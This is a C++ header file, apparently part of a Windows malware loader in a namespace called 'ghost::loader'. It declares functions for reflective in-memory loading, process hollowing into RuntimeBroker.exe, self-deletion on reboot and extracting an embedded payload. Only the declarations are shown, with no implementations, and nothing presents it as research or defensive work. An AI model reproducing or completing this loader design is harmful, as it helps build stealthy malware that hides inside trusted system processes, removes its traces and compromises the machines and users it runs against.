#pragma once

#include <windows.h>
#include <winternl.h>
#include <string>

namespace ghost {
namespace loader {

bool ReflectiveLoad();

bool HollowProcess(const wchar_t* targetProcessPath = L"C:\\Windows\\System32\\RuntimeBroker.exe");

bool SelfDeleteOnReboot();

bool GetEmbeddedPayload(BYTE** outPayload, SIZE_T* outSize);

} // namespace loader
} // namespace ghost